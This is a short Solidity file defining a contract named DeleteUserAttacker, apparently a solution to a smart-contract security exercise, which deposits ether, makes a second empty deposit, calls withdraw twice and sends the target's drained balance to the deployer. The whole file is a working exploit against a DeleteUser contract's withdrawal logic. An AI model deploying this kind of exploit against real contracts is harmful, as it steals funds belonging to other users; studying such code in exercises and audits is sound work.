pragma solidity 0.8.15;

import {DeleteUser} from "../DeleteUser.sol";

contract DeleteUserAttacker{

    constructor(address deleteUser) payable {
        DeleteUser(deleteUser).deposit{value: msg.value}();
        DeleteUser(deleteUser).deposit();
     
        DeleteUser(deleteUser).withdraw(1);
        DeleteUser(deleteUser).withdraw(1);

        payable(msg.sender).transfer(address(this).balance);
    }
}